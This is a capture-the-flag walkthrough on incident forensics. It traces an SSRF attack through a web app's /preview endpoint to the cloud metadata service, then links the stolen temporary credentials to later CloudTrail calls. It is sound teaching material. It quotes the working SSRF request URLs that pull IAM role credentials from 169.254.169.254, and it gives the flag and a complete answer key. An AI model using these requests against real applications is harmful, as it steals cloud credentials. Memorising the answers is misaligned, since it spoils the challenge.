# Cloud Task 2 — SSRF to IMDS: Walkthrough

**Author:** 7ankalis — Securinets ENIT
**Flag:** SecurinetsENIT{cacea9745843ea2d6823e118a564146c}

## Step 1 — Read the web access log

    cat evidence/nginx-access.log

Output:

    154.108.154.113 - - [07/Oct/2026:14:37:33 +0000] "GET /preview?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 325 "-" "curl/8.5.0"
    154.108.154.113 - - [07/Oct/2026:14:37:34 +0000] "GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 19 "-" "curl/8.5.0"
    154.108.154.113 - - [07/Oct/2026:14:37:34 +0000] "GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-preview-role HTTP/1.1" 200 1570 "-" "curl/8.5.0"

Three requests from one IP. Each fetches a deeper IMDS path.

## Step 2 — Identify the SSRF

- Endpoint: `/preview`
- Parameter: `url`
- Attacker IP: `154.108.154.113`
- User-Agent: `curl/8.5.0`
- IMDS target: `169.254.169.254`

The attacker is using the app's URL fetch feature to reach the metadata
service. This is textbook SSRF.

## Step 3 — Understand what the attacker got

The third request (1570 bytes in response) returned the IAM role's
credentials:

    {
      "Code": "Success",
      "AccessKeyId": "ASIAVQRHQHH5IDT6H2UK",
      "SecretAccessKey": "...",
      "Token": "...",
      "Expiration": "..."
    }

Access key prefix `ASIA` = temporary session credentials issued by STS
for an assumed role. Not long-lived IAM user credentials (`AKIA`).

## Step 4 — Read the CloudTrail log

    jq -r '.Records[] | "\(.eventTime) \(.eventName) \(.sourceIPAddress)"' evidence/cloudtrail.json

Output:

    2026-10-07T14:37:42Z GetCallerIdentity 154.108.154.113
    2026-10-07T14:37:50Z ListBuckets 154.108.154.113

Two events from the same attacker IP. Timestamps are 8 seconds after
the SSRF requests — the attacker used the stolen credentials
immediately.

## Step 5 — Identify the role

    jq -r '.Records[0].userIdentity.arn' evidence/cloudtrail.json

    arn:aws:sts::379113716218:assumed-role/webapp-preview-role/i-0a00ce44211fc98ae

Break it down:

- `arn:aws:sts` — STS session
- `379113716218` — account
- `webapp-preview-role` — the role name
- `i-0a00ce44211fc98ae` — the EC2 instance ID that hosted the role

## Answer table

| # | Question | Answer |
|---|---|---|
| 1 | Public IP of the webapp | 98.87.168.89 |
| 2 | Vulnerable endpoint | /preview |
| 3 | Query parameter | url |
| 4 | Attacker source IP | 154.108.154.113 |
| 5 | Attacker User-Agent | curl/8.5.0 |
| 6 | Blocked scheme | file |
| 7 | SSRF target IP | 169.254.169.254 |
| 8 | IAM role name | webapp-preview-role |
| 9 | AccessKeyId from IMDS | ASIAVQRHQHH5IDT6H2UK |
| 10 | IMDS version | v1 |
| 11 | First API call with stolen creds | GetCallerIdentity |
| 12 | Second API call with stolen creds | ListBuckets |
| 13 | Assumed role session ARN | arn:aws:sts::379113716218:assumed-role/webapp-preview-role/i-0a00ce44211fc98ae |
| 14 | Instance ID | i-0a00ce44211fc98ae |
| 15 | Number of CloudTrail events | 2 |

## What the player learns

- SSRF is a path from a web app to cloud metadata
- IMDSv1 is unprotected; IMDSv2 requires a token
- `ASIA` vs `AKIA` prefix distinction
- Role ARNs encode the EC2 instance ID
- Correlating web logs with CloudTrail tells the complete story
